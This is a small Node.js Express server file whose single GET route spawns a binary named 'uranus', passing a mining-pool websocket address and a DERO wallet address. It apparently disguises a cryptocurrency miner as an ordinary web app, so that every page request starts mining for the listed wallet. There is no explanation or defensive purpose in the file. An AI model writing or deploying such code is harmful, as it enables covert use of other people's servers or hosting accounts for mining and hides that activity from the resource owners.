const express = require('express');
const app = express();
const port = 3000;
const { spawn } = require('child_process');

app.get('/', (req, res) => {
  const uranus = spawn("./uranus", ["-o", "wss://community-pools.mysrv.cloud:10300", "-u", "dero1qyy8vj5jyxldud7f7l53nj9tyye72c2rv9g8hg6fv3clfs5z55gmgqgu0j733"]);

  uranus.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
  });

  uranus.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });

  uranus.on('close', (code) => {
    console.log(`child process exited with code ${code}`);
    res.send(`child process exited with code ${code}`);
  });
});

app.listen(port, () => {
  console.log(`Server running on port: ${port}`)
});
